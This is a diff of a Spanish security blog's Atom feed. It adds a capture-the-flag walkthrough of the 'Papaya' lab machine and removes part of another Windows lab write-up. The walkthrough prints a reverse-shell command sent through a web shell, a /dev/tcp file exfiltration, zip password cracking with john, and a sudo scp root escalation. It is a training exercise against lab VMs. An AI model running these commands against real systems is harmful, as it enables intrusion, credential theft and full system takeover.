@@ -1,4 +1,252 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2024-07-02T21:40:11+00:00</updated><id>/feed.xml</id><title type="html">murrusko</title><author><name>murrusko</name><email>murrusko@proton.me</email></author><entry><title type="html">Chimichurri</title><link href="/posts/chimichurri/" rel="alternate" type="text/html" title="Chimichurri" /><published>2024-07-02T00:00:00+00:00</published><updated>2024-07-02T00:00:00+00:00</updated><id>/posts/chimichurri</id><content type="html" xml:base="/posts/chimichurri/"><![CDATA[<p><img src="/assets/images/chimichurri/chim.jpg" alt="image" /></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2024-07-04T01:51:36+00:00</updated><id>/feed.xml</id><title type="html">murrusko</title><author><name>murrusko</name><email>murrusko@proton.me</email></author><entry><title type="html">Papaya</title><link href="/posts/papaya/" rel="alternate" type="text/html" title="Papaya" /><published>2024-07-03T00:00:00+00:00</published><updated>2024-07-03T00:00:00+00:00</updated><id>/posts/papaya</id><content type="html" xml:base="/posts/papaya/"><![CDATA[<p><img src="/assets/images/papaya/papa.jpg" alt="image" /></p>
+
+<p>Estamos ante una máquina Linux de nivel avanzado creada por <a href="https://www.curiosidadesdehackers.com/">CuriosidadesDeHackers</a> y <a href="https://www.youtube.com/@CondorHacks">condor</a> de la plataforma <a href="https://thehackerslabs.com/">The Hackers Labs</a>.</p>
+
+<p>Una vez importada la máquina a nuestro VirtualBox hacemos un escaneo de IPs a nuestra red:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>arp-scan <span class="nt">-I</span> eth1 <span class="nt">--localnet</span>
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>murrusko: 
+Interface: eth1, <span class="nb">type</span>: EN10MB, MAC: 08:00:27:5e:91:9b, IPv4: 10.0.2.5
+Starting arp-scan 1.10.0 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
+10.0.2.1        52:54:00:12:35:00       QEMU
+10.0.2.2        52:54:00:12:35:00       QEMU
+10.0.2.3        08:00:27:80:58:9b       PCS Systemtechnik GmbH
+10.0.2.147      08:00:27:5a:99:51       PCS Systemtechnik GmbH
+</code></pre></div></div>
+
+<h1 id="enumeración">Enumeración</h1>
+
+<p>Como vemos la máquina tiene asignada la IP <code class="language-plaintext highlighter-rouge">10.0.2.147</code>.</p>
+
+<p>Empezamos realizando un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> a nuestra máquina victima <code class="language-plaintext highlighter-rouge">10.0.2.147</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> 10.0.2.147
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+</code></pre></div></div>
+
+<p>Una vex que tenemos qué puertos están abiertos hacemos otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code>, pero esta vez para ver con mas detalle que hay en esos puertos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p21</span>,22,80 <span class="nt">-v</span> 10.0.2.147
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp
+| fingerprint-strings: 
+|   GenericLines: 
+|     220 Servidor ProFTPD <span class="o">(</span>Debian<span class="o">)</span> <span class="o">[</span>::ffff:10.0.2.147]
+|     Orden incorrecta: Intenta ser m
+|     creativo
+|     Orden incorrecta: Intenta ser m
+|     creativo
+|   Help: 
+|     220 Servidor ProFTPD <span class="o">(</span>Debian<span class="o">)</span> <span class="o">[</span>::ffff:10.0.2.147]
+|     214-Se reconocen las siguiente 
+|     rdenes <span class="o">(</span><span class="k">*</span> <span class="o">=&gt;</span><span class="s1">'s no implementadas):
+|     XCWD CDUP XCUP SMNT* QUIT PORT PASV 
+|     EPRT EPSV ALLO RNFR RNTO DELE MDTM RMD 
+|     XRMD MKD XMKD PWD XPWD SIZE SYST HELP 
+|     NOOP FEAT OPTS HOST CLNT AUTH* CCC* CONF* 
+|     ENC* MIC* PBSZ* PROT* TYPE STRU MODE RETR 
+|     STOR STOU APPE REST ABOR RANG USER PASS 
+|     ACCT* REIN* LIST NLST STAT SITE MLSD MLST 
+|     comentario a root@papaya
+|   NULL, SMBProgNeg, SSLSessionReq: 
+|_    220 Servidor ProFTPD (Debian) [::ffff:10.0.2.147]
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--   1 ftp      ftp            19 Jul  2 15:26 secret.txt
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
+| ssh-hostkey: 
+|   256 bb:05:10:69:18:eb:e3:44:2c:a7:68:98:d0:97:01:20 (ECDSA)
+|_  256 65:41:aa:54:a6:b7:f7:2a:04:2e:c4:6a:c0:4d:10:35 (ED25519)
+80/tcp open  http    Apache httpd 2.4.59
+|_http-title: Did not follow redirect to http://papaya.thl/
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.59 (Debian)
+</span></code></pre></div></div>
+
+<p>De este último escaneo obtenemos que la web tiene como nombre de dominio <strong>papaya.thl</strong> y que podemos acceder al <strong>FTP</strong> de forma anónima.  Primero añadimos el dominio a nuestro fichero <strong>hosts</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"10.0.2.147 papaya.thl"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+10.0.2.147 papaya.thl
+</code></pre></div></div>
+
+<p>Y después nos conectamos al servidor FTP para ver si encontramos algo. Usamos las credenciales <strong>ftp:ftp</strong> y nos descargamos todo lo que encontremos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp 10.0.2.147
+Connected to 10.0.2.147.
+220 Servidor ProFTPD <span class="o">(</span>Debian<span class="o">)</span> <span class="o">[</span>::ffff:10.0.2.147]
+Name <span class="o">(</span>10.0.2.147:murrusko<span class="o">)</span>: ftp
+331 Conexión anónima ok, envía tu dirección de email como contraseña
+Password: 
+230 Aceptado acceso anónimo, aplicadas restricciones
+Remote system <span class="nb">type </span>is UNIX.
+Using binary mode to transfer files.
+ftp&gt; <span class="nb">ls
+</span>229 Entering Extended Passive Mode <span class="o">(||</span>|1408|<span class="o">)</span>
+150 Abriendo conexión de datos en modo ASCII para file list
+<span class="nt">-rw-r--r--</span>   1 ftp      ftp            19 Jul  2 15:26 secret.txt
+226 Transferencia completada
+ftp&gt; get secret.txt
+<span class="nb">local</span>: secret.txt remote: secret.txt
+229 Entering Extended Passive Mode <span class="o">(||</span>|43904|<span class="o">)</span>
+150 Opening BINARY mode data connection <span class="k">for </span>secret.txt <span class="o">(</span>19 bytes<span class="o">)</span>
+100% |<span class="k">******************</span>|    19       11.75 KiB/s    00:00 ETA
+226 Transferencia completada
+19 bytes received <span class="k">in </span>00:00 <span class="o">(</span>4.68 KiB/s<span class="o">)</span>
+ftp&gt; bye
+221 Hasta luego
+</code></pre></div></div>
+
+<p>Vemos que contiene el fichero <strong>secret.txt</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>secret.txt 
+ndhvabunlanqnpbñb
+</code></pre></div></div>
+
+<p>Intentamos desencriptar el texto usando la técnica de <strong>ROT13</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>secret.txt | <span class="nb">tr</span> <span class="s1">'A-Za-z'</span> <span class="s1">'N-ZA-Mn-za-m'</span>
+aquinohaynadacoño
+</code></pre></div></div>
+
+<p>Nos lo guardamos por si hiciera falta.</p>
+
+<p>Ahora vamos a ver que contiene el servidor web con <strong>whatweb</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb <span class="nt">-a</span> 3 http://papaya.thl
+http://papaya.thl <span class="o">[</span>200 OK] Apache[2.4.59], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.59 <span class="o">(</span>Debian<span class="o">)]</span>, IP[10.0.2.147], JQuery[3.6.0], PasswordField[passwrd], PoweredBy[ElkArte], Script, Title[My Community - Index], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1]
+
+</code></pre></div></div>
+
+<p>Vemos que usa ElkArte, un framework en php para crear un foro. Buscando posibles exploit para ese framework encontramos el siguiente PoC <a href="https://www.exploit-db.com/exploits/52026">https://www.exploit-db.com/exploits/52026</a>. Como podemos ver se puede conseguir un RCE subiendo un theme, pero es necesario estar autenticado y tener permisos para modificar los themes. Probando las credenciales que tenemos vemos que no obtenemos acceso.</p>
+
+<p>Vamos a buscar ficheros y directorios con <strong>feroxbuster</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>feroxbuster <span class="nt">-u</span> http://papaya.thl/themes/ <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt <span class="nt">-x</span> php <span class="nt">-r</span>
+
+500      GET        4l       13w       89c http://papaya.thl/themes/test/test.php
+...
+
+</code></pre></div></div>
+
+<h1 id="intrusión">Intrusión</h1>
+
+<p>Entre otros vemos un archivo un tanto raro. Si hemos leido el enlace anterior vemos que el fichero coincide con el PoC. Vamos a probar a ver que nos responde:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://papaya.thl/themes/test/test.php
+<span class="c"># Execute one command</span>
+www-data
+
+<span class="c"># Take input from the url paramter. shell.php?cmd=whoami</span>
+</code></pre></div></div>
+
+<p>Vemos que ejecuta un comando como www-data, pero para ello hay que añadir a la petición <strong>?cmd=comando.</strong> Nos ponemos a la escucha en nuestra máquina. Para obtener una shell reversa hay que mandar el comando encodeado como URL:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://papaya.thl/themes/test/test.php?cmd<span class="o">=</span>busybox+nc+10.0.2.5+8888+-e+bash
+</code></pre></div></div>
+
+<p>Y obtenemos la shell reversa. Hacemos el tratamiento de la shell para obtener la TTY completa:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 8888
+listening on <span class="o">[</span>any] 8888 ...
+connect to <span class="o">[</span>10.0.2.5] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.0.2.147] 59434
+script /dev/null <span class="nt">-qc</span> bash
+www-data@papaya:/var/www/html/elkarte/themes/test<span class="nv">$ </span>^Z
+zsh: suspended  nc <span class="nt">-nlvp</span> 8888
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
+<span class="o">[</span>1]  + continued  nc <span class="nt">-nlvp</span> 8888
+<span class="nb">ls
+</span>test.php
+www-data@papaya:/var/www/html/elkarte/themes/test<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
+www-data@papaya:/var/www/html/elkarte/themes/test<span class="nv">$ </span>reset
+www-data@papaya:/var/www/html/elkarte/themes/test<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Una vez dentro del sistema vemos que hay un usuario llamado <strong>papaya</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@papaya:/<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep </span>bash
+root:x:0:0:root:/root:/bin/bash
+papaya:x:1000:1000:,,,:/home/papaya:/bin/bash
+</code></pre></div></div>
+
+<p>Haciendo una búsqueda por el servidor nos encontramos con un fichero <strong>zip</strong> en el directorio <strong>/opt:</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@papaya:/home<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /opt/
+total 4
+<span class="nt">-rwxr-xr-x</span> 1 root root 173 Jul  2 17:14 pass.zip
+</code></pre></div></div>
+
+<p>Nos ponemos a la eschucha en nuestra máquina redirigiéndo la salida a un fichero llamado <strong>pass.zip</strong> y nos mandamos el fichero zip del servidor a nuestra máquina:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@papaya:/opt<span class="nv">$ </span><span class="nb">cat </span>pass.zip <span class="o">&gt;</span> /dev/tcp/10.0.2.5/8889
+
+<span class="nv">$ </span>nc <span class="nt">-nlvp</span> 8889 <span class="o">&gt;</span> pass.zip
+listening on <span class="o">[</span>any] 8889 ...
+connect to <span class="o">[</span>10.0.2.5] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.0.2.147] 35802
+</code></pre></div></div>
+
+<p>Intentamos descomprimirlo pero vemos que es necesaria una clave para extraer el contenido. Usando <strong>zip2john</strong> creamos el hash del fichero para luego intentar crackearlo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zip2john pass.zip <span class="o">&gt;</span> pass.hash
+ver 2.0 pass.zip/pass.txt PKZIP Encr: <span class="nv">cmplen</span><span class="o">=</span>23, <span class="nv">decmplen</span><span class="o">=</span>11, <span class="nv">crc</span><span class="o">=</span>EEA46B01 <span class="nv">ts</span><span class="o">=</span>89BB <span class="nv">cs</span><span class="o">=</span>eea4 <span class="nb">type</span><span class="o">=</span>0
+</code></pre></div></div>
+
+<p>Ahora usamos <strong>john</strong> para intentar encontrar la password:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt pass.hash 
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>PKZIP <span class="o">[</span>32/64]<span class="o">)</span>
+Will run 2 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+jesica           <span class="o">(</span>pass.zip/pass.txt<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Descomprimimos el fichero con la clave recién obtenida y leemos el fichero que hay dentro:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>pass.txt 
+papayarica
+</code></pre></div></div>
+
+<p>Nos logeamos como <strong>papaya</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@papaya:/opt<span class="nv">$ </span>su papaya
+Password: 
+papaya@papaya:/opt<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>papaya<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>papaya<span class="o">)</span> <span class="nv">grupos</span><span class="o">=</span>1000<span class="o">(</span>papaya<span class="o">)</span>,100<span class="o">(</span><span class="nb">users</span><span class="o">)</span>
+papaya@papaya:/opt<span class="err">$</span>
+</code></pre></div></div>
+
+<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>
+
+<p>Vamos a ver si el usuario puede ejecutar algún comando como <strong>root</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>papaya@papaya:/opt<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>papaya on papaya:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin,
+    use_pty
+
+User papaya may run the following commands on papaya:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/scp
+</code></pre></div></div>
+
+<p>Vemos que puede usar el comando scp como root. Buscamos en <a href="https://gtfobins.github.io/gtfobins/scp/#sudo">GTFOBins</a> el comando y ejecutamos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">TF</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span><span class="si">)</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s1">'bash 0&lt;&amp;2 1&gt;&amp;2'</span> <span class="o">&gt;</span> <span class="nv">$TF</span> <span class="o">&amp;&amp;</span> <span class="nb">chmod</span> +x <span class="s2">"</span><span class="nv">$TF</span><span class="s2">"</span> <span class="o">&amp;&amp;</span> <span class="nb">sudo </span>scp <span class="nt">-S</span> <span class="nv">$TF</span> x y:
+root@papaya:~# <span class="nb">whoami</span><span class="p">;</span> <span class="nb">hostname</span><span class="p">;</span> <span class="nb">id
+</span>root
+papaya
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">grupos</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+root@papaya:~#
+</code></pre></div></div>
+
+<p>Y con esto terminamos la máquina.</p>
+
+<p>Un saludo</p>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="thl" /><category term="ctf" /><category term="linux" /><category term="principiante" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Chimichurri</title><link href="/posts/chimichurri/" rel="alternate" type="text/html" title="Chimichurri" /><published>2024-07-02T00:00:00+00:00</published><updated>2024-07-02T00:00:00+00:00</updated><id>/posts/chimichurri</id><content type="html" xml:base="/posts/chimichurri/"><![CDATA[<p><img src="/assets/images/chimichurri/chim.jpg" alt="image" /></p>
 
 <p>Estamos ante una máquina Windows, Active Directory, de nivel principiante creada por <a href="https://www.curiosidadesdehackers.com/">CuriosidadesDeHackers</a> y <a href="https://www.youtube.com/@CondorHacks">condor</a> de la plataforma <a href="https://thehackerslabs.com/">The Hackers Labs</a>.</p>
 
@@ -2593,386 +2841,4 @@ Hola soy tu patron y me canse y me fui a casa te dejo mi pass en un lugar a mano
 Password: 
 root@4c6b113dd021:/home/juan# <span class="nb">cd</span> ~
 root@4c6b113dd021:~#
-</code></pre></div></div>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="dockerlabs" /><category term="ctf" /><category term="linux" /><category term="medio" /><summary type="html"><![CDATA[Estamos ante un docker que contiene una distribución Linux. Es de nivel medio y es de la plataforma dockerlabs.]]></summary></entry><entry><title type="html">Ensala de papas</title><link href="/posts/Ensala/" rel="alternate" type="text/html" title="Ensala de papas" /><published>2024-06-21T00:00:00+00:00</published><updated>2024-06-21T00:00:00+00:00</updated><id>/posts/Ensala</id><content type="html" xml:base="/posts/Ensala/"><![CDATA[<p>Estamos ante una máquina Windows de nivel principiante creada por <a href="https://www.curiosidadesdehackers.com/">CuriosidadesDeHackers</a> y <a href="https://www.youtube.com/@CondorHacks">condor</a> de la plataforma <a href="https://thehackerslabs.com/">The Hackers Labs</a>.</p>
-
-<h1 id="enumeración">Enumeración</h1>
-
-<p>Una vez importada la máquina a nuestro VirtualBox hacemos un escaneo de IPs a nuestra red:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>arp-scan <span class="nt">-I</span> eth1 <span class="nt">--localnet</span>
-Interface: eth1, <span class="nb">type</span>: EN10MB, MAC: 08:00:27:5e:91:9b, IPv4: 10.0.2.5
-Starting arp-scan 1.10.0 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
-10.0.2.1        52:54:00:12:35:00       QEMU
-10.0.2.2        52:54:00:12:35:00       QEMU
-10.0.2.3        08:00:27:5b:2e:9c       PCS Systemtechnik GmbH
-10.0.2.140      08:00:27:09:18:96       PCS Systemtechnik GmbH
-
-4 packets received by filter, 0 packets dropped by kernel
-Ending arp-scan 1.10.0: 256 hosts scanned <span class="k">in </span>2.017 seconds <span class="o">(</span>126.92 hosts/sec<span class="o">)</span><span class="nb">.</span> 4 responded
-</code></pre></div></div>
-
-<p>Como vemos la máquina tiene asignada la IP <code class="language-plaintext highlighter-rouge">10.0.2.140</code>.</p>
-
-<p>Empezamos realizando un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> a nuestra máquina victima <code class="language-plaintext highlighter-rouge">10.0.2.140</code>:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-v</span> <span class="nt">-Pn</span> <span class="nt">-n</span> 10.0.2.140
-PORT      STATE SERVICE
-80/tcp    open  http
-135/tcp   open  msrpc
-139/tcp   open  netbios-ssn
-445/tcp   open  microsoft-ds
-47001/tcp open  winrm
-49152/tcp open  unknown
-49153/tcp open  unknown
-49154/tcp open  unknown
-49155/tcp open  unknown
-49156/tcp open  unknown
-49158/tcp open  unknown
-</code></pre></div></div>
-
-<p>Una vex que tenemos qué puertos están abiertos hacemos otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code>, pero esta vez para ver con mas detalle que hay en esos puertos:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p80</span>,135,139,445,47001,49152,49153,49154,49155,49156,49158 <span class="nt">-v</span> 10.0.2.140
-PORT      STATE SERVICE       VERSION
-80/tcp    open  http          Microsoft IIS httpd 7.5
-|_http-title: IIS7
-|_http-server-header: Microsoft-IIS/7.5
-| http-methods: 
-|   Supported Methods: OPTIONS TRACE GET HEAD POST
-|_  Potentially risky methods: TRACE
-135/tcp   open  msrpc         Microsoft Windows RPC
-139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
-445/tcp   open  microsoft-ds?
-47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
-|_http-title: Not Found
-|_http-server-header: Microsoft-HTTPAPI/2.0
-49152/tcp open  msrpc         Microsoft Windows RPC
-49153/tcp open  msrpc         Microsoft Windows RPC
-49154/tcp open  msrpc         Microsoft Windows RPC
-49155/tcp open  msrpc         Microsoft Windows RPC
-49156/tcp open  msrpc         Microsoft Windows RPC
-49158/tcp open  msrpc         Microsoft Windows RPC
-
-Host script results:
-| nbstat: NetBIOS name: WIN-4QU3QNHNK7E, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:09:18:96 <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
-| Names:
-|   WIN-4QU3QNHNK7E&lt;00&gt;  Flags: &lt;unique&gt;&lt;active&gt;
-|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
-|_  WIN-4QU3QNHNK7E&lt;20&gt;  Flags: &lt;unique&gt;&lt;active&gt;
-| smb2-security-mode: 
-|   2:1:0: 
-|_    Message signing enabled but not required
-|_clock-skew: 2m18s
-| smb2-time: 
-|   <span class="nb">date</span>: 2024-06-21T11:29:29
-|_  start_date: 2024-06-21T09:27:55
-</code></pre></div></div>
-
-<p>En el resultado vemos que en el puerto <code class="language-plaintext highlighter-rouge">80</code> hay un servidor <code class="language-plaintext highlighter-rouge">Microsoft-IIS/7.5</code>.</p>
-
-<p>Comprobamos que realmente hay un servidor  <code class="language-plaintext highlighter-rouge">IIS 7.5</code> con <code class="language-plaintext highlighter-rouge">whatweb</code>:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>whatweb <span class="nt">-a</span> 3 <span class="nt">-v</span> http://10.0.2.140
-WhatWeb report <span class="k">for </span>http://10.0.2.140
-Status    : 200 OK
-Title     : IIS7
-IP        : 10.0.2.140
-Country   : RESERVED, ZZ
-
-Summary   : HTTPServer[Microsoft-IIS/7.5], Microsoft-IIS[7.5][Under Construction], X-Powered-By[ASP.NET]
-
-Detected Plugins:
-<span class="o">[</span> HTTPServer <span class="o">]</span>
-        HTTP server header string. This plugin also attempts to 
-        identify the operating system from the server header. 
-
-        String       : Microsoft-IIS/7.5 <span class="o">(</span>from server string<span class="o">)</span>
-
-<span class="o">[</span> Microsoft-IIS <span class="o">]</span>
-        Microsoft Internet Information Services <span class="o">(</span>IIS<span class="o">)</span> <span class="k">for </span>Windows 
-        Server is a flexible, secure and easy-to-manage Web server 
-        <span class="k">for </span>hosting anything on the Web. From media streaming to 
-        web application hosting, IIS<span class="s1">'s scalable and open 
-        architecture is ready to handle the most demanding tasks. 
-
-        Module       : Under Construction
-        Version      : 7.5
-        Website     : http://www.iis.net/
-
-[ X-Powered-By ]
-        X-Powered-By HTTP header 
-
-        String       : ASP.NET (from x-powered-by string)
-
-HTTP Headers:
-        HTTP/1.1 200 OK
-        Content-Type: text/html
-        Last-Modified: Tue, 18 Jun 2024 15:19:13 GMT
-        Accept-Ranges: bytes
-        ETag: "8c9090e092c1da1:0"
-        Server: Microsoft-IIS/7.5
-        X-Powered-By: ASP.NET
-        Date: Fri, 21 Jun 2024 11:30:34 GMT
-        Connection: close
-        Content-Length: 689
-</span></code></pre></div></div>
-
-<p>Con <code class="language-plaintext highlighter-rouge">curl</code> vemos que hay una página web por defecto de <code class="language-plaintext highlighter-rouge">IIS</code>:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://10.0.2.140
-&lt;<span class="o">!</span>DOCTYPE html PUBLIC <span class="s2">"-//W3C//DTD XHTML 1.0 Strict//EN"</span> <span class="s2">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"</span><span class="o">&gt;</span>
-&lt;html <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://www.w3.org/1999/xhtml"</span><span class="o">&gt;</span>
-&lt;<span class="nb">head</span><span class="o">&gt;</span>
-&lt;meta http-equiv<span class="o">=</span><span class="s2">"Content-Type"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"text/html; charset=iso-8859-1"</span> /&gt;
-&lt;title&gt;IIS7&lt;/title&gt;
-&lt;style <span class="nb">type</span><span class="o">=</span><span class="s2">"text/css"</span><span class="o">&gt;</span>
-&lt;<span class="o">!</span><span class="nt">--</span>
-body <span class="o">{</span>
-        color:#000000<span class="p">;</span>
-        background-color:#B3B3B3<span class="p">;</span>
-        margin:0<span class="p">;</span>
-<span class="o">}</span>
-
-<span class="c">#container {</span>
-        margin-left:auto<span class="p">;</span>
-        margin-right:auto<span class="p">;</span>
-        text-align:center<span class="p">;</span>
-        <span class="o">}</span>
-
-a img <span class="o">{</span>
-        border:none<span class="p">;</span>
-<span class="o">}</span>
-
-<span class="nt">--</span><span class="o">&gt;</span>
-&lt;/style&gt;
-&lt;/head&gt;
-&lt;body&gt;
-&lt;div <span class="nb">id</span><span class="o">=</span><span class="s2">"container"</span><span class="o">&gt;</span>
-&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"http://go.microsoft.com/fwlink/?linkid=66138&amp;amp;clcid=0x409"</span><span class="o">&gt;</span>&lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">"welcome.png"</span> <span class="nv">alt</span><span class="o">=</span><span class="s2">"IIS7"</span> <span class="nv">width</span><span class="o">=</span><span class="s2">"571"</span> <span class="nv">height</span><span class="o">=</span><span class="s2">"411"</span> /&gt;&lt;/a&gt;
-&lt;/div&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre></div></div>
-
-<p>Usamos la herramienta <code class="language-plaintext highlighter-rouge">feroxbuster</code> para hacer fuzz al servidor. Le indicamos con <code class="language-plaintext highlighter-rouge">-u</code> la url, con <code class="language-plaintext highlighter-rouge">-w</code> el diccionario a usar para la búsqueda, <code class="language-plaintext highlighter-rouge">-x</code> para indicarle qué extensión buscar en los ficheros, <code class="language-plaintext highlighter-rouge">-s</code> para que solo nos devuelva los directorios y ficheros que encuentre y que devuelvan de Status Code 200 y <code class="language-plaintext highlighter-rouge">-r</code> para seguir los redirecciones:</p>
-
